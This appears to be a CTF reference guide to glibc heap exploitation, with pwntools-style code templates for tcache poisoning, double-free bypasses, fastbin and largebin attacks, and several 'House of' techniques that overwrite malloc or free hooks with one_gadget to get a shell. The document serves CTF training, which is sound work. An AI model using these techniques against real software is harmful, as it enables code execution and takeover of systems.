# CTF Heap Exploitation — Advanced Techniques

Advanced glibc heap attacks for modern allocator (libc 2.27–2.35+). Assumes basic BOF/UAF knowledge.

## Install

```bash
pip install pwntools --break-system-packages
sudo apt-get install -y gdb gdb-peda libc6-dbg
# pwndbg (best heap commands):
git clone https://github.com/pwndbg/pwndbg /opt/pwndbg && cd /opt/pwndbg && ./setup.sh
# libc version checker:
ldd ./challenge | grep libc | awk '{print $3}' | xargs strings | grep "GNU C"
```

---

## Phase 1: Libc & Heap Recon

```bash
# Get libc version — determines available attacks:
ldd ./challenge
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"
# OR: file /lib/x86_64-linux-gnu/libc.so.6

# Get libc base (if PIE off or after leak):
python3 -c "
from pwn import *
elf = ELF('./challenge')
libc = ELF('./libc.so.6')
print(hex(libc.sym['malloc']))
print(hex(libc.sym['__malloc_hook']))   # target for older libcs
print(hex(libc.sym['__free_hook']))     # target for ≤ 2.33
"

# GDB heap inspection (pwndbg):
gdb ./challenge
heap         # show all chunks
bins         # show all bins (tcache, fastbin, unsorted, small, large)
chunks       # list all allocated/freed chunks
vis_heap_chunks   # visual heap layout
```

---

## Phase 2: Tcache Attacks (libc 2.27–2.34)

### Tcache Poisoning (libc 2.27–2.28)

```python
# Tcache: singly-linked free list per size class, 7 entries max
# No integrity check in 2.27 — fd pointer can be anything

from pwn import *
p = process('./challenge')

# 1. Allocate and free two same-size chunks into tcache
alloc(0x40)   # chunk A
alloc(0x40)   # chunk B (to avoid consolidation with top)
free(A)       # tcache[0x40]: A → NULL

# 2. Overwrite fd of A (via UAF or heap overflow) to target address
write(A, p64(target_addr))   # tcache[0x40]: A → target

# 3. Allocate twice → second alloc returns target
alloc(0x40)   # returns A
alloc(0x40)   # returns target (e.g. __malloc_hook, __free_hook, stack)

# Write shellcode/one_gadget to __free_hook:
write(target, p64(one_gadget))
free(any_chunk)   # triggers one_gadget → shell
```

### Tcache Dup (Double Free, libc 2.27)

```python
# libc 2.27: no double-free check in tcache
alloc(0x40)   # chunk A
free(A)       # tcache: A → NULL
free(A)       # tcache: A → A (circular!) — works in 2.27
alloc(0x40)   # returns A, tcache: A → A
alloc(0x40)   # returns A again

# libc 2.28+: key field added — bypass:
# After first free, A->key = tcache pointer
# Overwrite A->key (8 bytes at A+8) before second free
write(A, p64(0) + p64(0))   # clear key
free(A)   # second free now works
```

### Tcache Key Bypass (libc 2.29–2.34)

```python
# Overwrite the key field to bypass double-free protection
# key = address of tcache_perthread_struct (constant per run if no ASLR)
leak_heap_base()   # need heap address
tcache_struct = heap_base + 0x10   # typical offset

# Corrupt key field via partial overwrite (1-byte overflow):
overflow_into_key_byte(0x00)   # zero out key → double free allowed
```

---

## Phase 3: Fastbin Attacks (libc 2.23–2.26)

### Fastbin Dup into Stack

```python
# fastbin: 0x20–0x80 size range, singly-linked
# Vulnerability: double free allowed (no modern check)

alloc(0x60)   # chunk A (fastbin size)
alloc(0x60)   # chunk B
free(A)       # fastbin: A → NULL
free(B)       # fastbin: B → A
free(A)       # fastbin: A → B → A (circular)

alloc(0x60)   # returns A, fastbin: B → A
alloc(0x60)   # returns B
# Overwrite B->fd to point near stack:
write(B, p64(stack_target - 0x8))   # fake chunk header offset
alloc(0x60)   # returns A (fastbin: stack_target)
alloc(0x60)   # returns stack_target → write here!
```

### Fastbin into __malloc_hook

```python
# Classic: overwrite __malloc_hook with one_gadget
# __malloc_hook - 0x23 often has valid fake size (0x7f)

libc_base = leaked_libc_addr - libc.sym['puts']
malloc_hook = libc_base + libc.sym['__malloc_hook']
fake_chunk = malloc_hook - 0x23   # size field at offset -3 = 0x7f (valid fast chunk for 0x70)

alloc(0x60); alloc(0x60)
free(A); free(B); free(A)
alloc(0x60)  # A
alloc(0x60)  # B — overwrite fd:
write(B, p64(fake_chunk))
alloc(0x60)  # A
alloc(0x60)  # fake_chunk near __malloc_hook
# Write one_gadget at __malloc_hook offset:
write(at_fake_chunk, b'\x00'*0x13 + p64(one_gadget))
alloc(1)     # triggers __malloc_hook → one_gadget
```

---

## Phase 4: Unsorted Bin Leak (libc address)

```python
# Freed chunk > 0x80 goes to unsorted bin
# Unsorted bin fd/bk → main_arena (+88 or +96) → libc

alloc(0x100)   # chunk to leak
alloc(0x10)    # prevent top-chunk consolidation
free(A)        # goes to unsorted bin

# Read fd of freed A:
leak = read(A)[:8]
libc_leak = u64(leak)
libc_base = libc_leak - 0x3ebca0   # offset varies by libc version
# Verify: libc_base + libc.sym['puts'] should match known puts address

# Find correct offset:
# gdb: p/x &main_arena - (void*)libc_base
```

---

## Phase 5: Largebin Attack (libc 2.29+)

```python
# Largebin attack: corrupt largebin bk_nextsize → arbitrary write during malloc
# Effect: write heap pointer to arbitrary location

# 1. Free large chunk → unsorted bin
alloc(0x440)   # L1
alloc(0x10)    # separator
free(L1)       # unsorted bin

# 2. Trigger unsorted bin sorting (alloc smaller):
alloc(0x430)   # L1 moves to largebin

# 3. Free second large chunk (same size class):
alloc(0x440)   # L2
alloc(0x10)    # separator
free(L2)       # unsorted bin

# 4. Overwrite L2->bk_nextsize → target - 0x20:
write(L2, p64(0) + p64(0) + p64(0) + p64(target - 0x20))

# 5. Trigger largebin insertion:
alloc(0x430)   # L2 sorted → writes heap+0x20 to target
# Result: target contains heap pointer (useful for bypassing ASLR)
```

---

## Phase 6: House of Techniques

### House of Force (libc ≤ 2.26)

```python
# Overflow top chunk size field → malloc arbitrary address
# top chunk size = -1 → any size alloc succeeds

overflow_top_chunk_size(p64(0xffffffffffffffff))  # set size = -1

# Calculate delta to target:
target = libc_base + libc.sym['__malloc_hook']
current_top = heap_base + known_offset
delta = target - current_top - 0x10   # subtract chunk header

alloc(delta)   # advance top chunk to target
alloc(0x10)    # returns target → overwrite __malloc_hook
```

### House of Botcake (tcache + unsorted bin, libc 2.29+)

```python
# Bypass tcache double-free check via unsorted bin consolidation
# Result: chunk in both tcache AND unsorted bin → overlapping allocs

alloc(0x100)  # prev (P)
alloc(0x100)  # victim (A)
alloc(0x10)   # separator

# Fill tcache for 0x100 size:
for _ in range(7): alloc(0x100); free(last_seven)

# Free P and A → A consolidates with P in unsorted bin:
free(P); free(A)

# Pop one from tcache:
alloc(0x100)

# Free A again → tcache now contains A:
free(A)   # A is in BOTH tcache AND overlaps with P in unsorted

# Alloc from unsorted bin → overlapping chunk:
alloc(0x120)   # overlaps with A

# Overwrite A->fd in tcache via overlap:
write(overlap, p64(target))
alloc(0x100)   # drains tcache slot A
alloc(0x100)   # returns target
```

### House of Orange (old, libc ≤ 2.25)

```python
# Corrupt top chunk size → malloc triggers sysmalloc → _IO_flush_all_lockp
# Requires: overflow to top chunk size, heap addr, libc addr
# No free needed — useful when no explicit free primitive

# Set top chunk size to 0xc01 (valid, smaller than current brk):
overflow_top_chunk(p64(0xc01))
alloc(0x1000)   # triggers sysmalloc → old top goes to unsorted bin

# Craft fake _IO_FILE structure in unsorted bin chunk:
# → overwrite _IO_list_all → _IO_flush → system("/bin/sh")
```

---

## Phase 7: GDB Heap Commands (pwndbg)

```bash
gdb ./challenge
run

# Heap inspection:
heap             # all chunks with sizes and status
bins             # tcache, fastbin, unsorted, small, large bins
vis_heap_chunks  # color-coded visual map
chunks 10        # last 10 chunks

# Find specific chunk:
malloc_chunk <addr>     # parse chunk header at address

# Tcache state:
tcache           # show tcache entries per size
p tcache_perthread_struct

# One-gadget finder:
one_gadget /lib/x86_64-linux-gnu/libc.so.6  # install: gem install one_gadget
```

---

## Phase 8: Libc Version Fingerprinting

```bash
# From challenge binary:
ldd ./challenge   # shows libc path

# From leak — search online:
# https://libc.blukat.me — paste leaked addresses
python3 -c "
from pwn import *
# After leaking puts address:
# libc = LibcSearcher('puts', puts_leak)
# libc_base = puts_leak - libc.dump('puts')
"

# Manual: check glibc symbol offsets:
python3 -c "
from pwn import *
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
print(hex(libc.sym['system']))
print(hex(libc.sym['__free_hook']))
print(hex(libc.sym['__malloc_hook']))
print(hex(next(libc.search(b'/bin/sh'))))
"
```

---

## Pro Tips

1. **Always check libc version first** — attacks differ dramatically between 2.27/2.29/2.31/2.34/2.35
2. **libc 2.34+**: `__malloc_hook` and `__free_hook` removed → use `__libc_system` overwrite via `exit` hooks or `IO_FILE` attack
3. **tcache count** — tcache holds max 7 per size; 8th free goes to fastbin/unsorted
4. **Heap leak**: allocate large chunk, free it, read first 8 bytes → libc main_arena pointer
5. **one_gadget** — `one_gadget libc.so.6` finds single-gadget RCE (no args needed)
6. **GLIBC safe-linking (2.32+)**: tcache fd = `(addr >> 12) XOR next` — deobfuscate with known heap bits
7. Heap base usually ends in `000` — single nibble brute force for partial overwrites

## Summary

Heap exploit flow: `checksec` → `ldd` for libc version → `gdb` with `pwndbg` → `heap/bins` to understand layout → identify primitive (UAF/overflow/double-free) → pick attack based on libc version → leak libc → overwrite hook/exit/IO_FILE → shell.
